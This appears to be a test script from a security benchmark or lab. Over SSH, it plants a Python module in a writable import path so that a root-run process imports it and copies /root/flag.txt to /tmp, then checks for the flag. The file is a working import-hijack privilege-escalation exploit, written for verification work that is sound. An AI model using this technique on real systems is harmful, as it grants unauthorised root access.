#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "$0")" && pwd)/_common.sh"
out="$(ssh_run '
PATHFILE="$HOME/.bench_python_hijack_path"
test -r "$PATHFILE" || { echo "missing hijack path file" >&2; exit 1; }
TARGET=$(cat "$PATHFILE")
rm -f /tmp/hijack_flag
cat > "${TARGET}/bench_hijack.py" <<'\''PY'\''
open("/tmp/hijack_flag", "w").write(open("/root/flag.txt").read())
PY
for i in $(seq 1 60); do
  if test -r /tmp/hijack_flag && grep -q FLAG /tmp/hijack_flag; then
    cat /tmp/hijack_flag
    exit 0
  fi
  sleep 1
done
echo "timeout waiting for root importer" >&2
ls -la "$TARGET/bench_hijack.py" /tmp/hijack_flag 2>&1 || true
exit 1
')"
assert_root_output "${out}"
